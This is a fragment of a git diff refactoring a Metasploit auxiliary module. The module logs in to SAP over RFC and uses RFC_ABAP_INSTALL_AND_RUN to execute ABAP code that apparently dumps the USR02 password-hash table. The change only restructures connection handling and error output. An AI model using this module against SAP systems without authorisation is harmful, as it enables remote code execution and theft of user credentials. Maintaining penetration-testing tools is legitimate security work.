@@ -49,8 +49,7 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def exec_USR02(user, client, pass, rhost, rport)
-    begin
-      conn = login(rhost, rport, client, user, pass)
+    login(rhost, rport, client, user, pass) do |conn|
       conn.connection_info
       function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
       fc = function.get_function_call
@@ -101,13 +100,7 @@ ABAPCODE
 
         print(saptbl.to_s)
       rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] FunctionCallException code: #{e.code} message: #{e.message}")
-      end
-    rescue NWError => e
-      # An exception shouldn't stop the scanner...
-    ensure
-      if conn
-        conn.disconnect
+        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
     end
   end
